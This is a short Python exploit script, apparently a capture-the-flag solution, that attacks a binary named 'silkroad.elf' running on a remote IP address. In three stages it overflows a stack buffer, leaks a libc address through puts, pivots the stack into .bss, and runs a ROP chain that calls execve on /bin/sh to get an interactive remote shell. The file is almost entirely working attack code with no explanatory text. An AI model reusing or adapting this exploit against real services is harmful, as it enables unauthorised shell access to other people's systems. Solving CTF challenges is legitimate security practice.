from ptrlib import *

secret = 790317143

libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
elf = ELF("./silkroad.elf")
#sock = Process("./silkroad.elf")
sock = Socket("82.196.10.106", 58399)
#_ = input()

plt_read = 0x004010a0
plt_puts = 0x00401070
rop_pop_rdi = 0x00401bab
addr_start = 0x401150

# Stage 1
payload = b'A' * 0x48
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
#payload += p64(rop_pop_rdi)
#payload += p64(elf.got("putchar"))
#payload += p64(plt_puts)
payload += p64(addr_start)
sock.recvuntil("ID: ")
sock.sendline(str(secret))
sock.recvuntil("nick: ")
sock.sendline(b"DreadPirateRobertsAiz\x00" + payload)
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
#addr_putchar = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("addr_puts = " + hex(addr_puts))
#dump("addr_putchar = " + hex(addr_putchar))
dump("libc base = " + hex(libc_base))
#addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.search("/bin/sh"))
addr_gets = libc_base + libc.symbol("gets")

rop_leave_ret = 0x00401298
rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rbp = libc_base + 0x00021353
rop_syscall = libc_base + 0x000013c0

stage3 = p64(0xdeadbeef)
stage3 += p64(rop_pop_rdi)
stage3 += p64(addr_binsh)
stage3 += p64(rop_pop_rsi)
stage3 += p64(0)
stage3 += p64(rop_pop_rdx)
stage3 += p64(0)
stage3 += p64(rop_pop_rax)
stage3 += p64(59)
stage3 += p64(rop_syscall)

# Stage 2
payload = b'A' * 0x48
payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss") + 0x100)
payload += p64(addr_gets)
payload += p64(rop_pop_rbp)
payload += p64(elf.section(".bss") + 0x100)
payload += p64(rop_leave_ret)
sock.recvuntil("ID: ")
sock.sendline(str(secret))
sock.recvuntil("nick: ")
sock.sendline(b"DreadPirateRobertsAiz\x00" + payload)
sock.recvline()

# Stage 3
sock.sendline(stage3)

sock.interactive()
